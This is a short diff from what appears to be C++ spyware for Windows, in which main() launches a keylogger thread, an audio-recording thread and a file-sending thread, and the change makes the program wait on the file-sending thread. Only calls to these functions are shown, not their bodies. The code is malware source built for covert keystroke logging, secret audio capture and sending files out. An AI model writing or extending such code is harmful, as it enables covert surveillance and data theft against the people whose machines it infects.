@@ -10,7 +10,7 @@ int main(){
     beginKeyloggerThread(keyloggerThread, reinterpret_cast<LPDWORD>(&keyloggerThreadId));
     beginAudioRecording(audioThread, reinterpret_cast<LPDWORD>(&audioThreadId));
     beginfileSendingThread(fileSendThread, reinterpret_cast<LPDWORD>(&fileSendThreadId));
-    WaitForSingleObject(audioThread, INFINITE);
+    WaitForSingleObject(fileSendThread, INFINITE);
     
     return 0;
 }
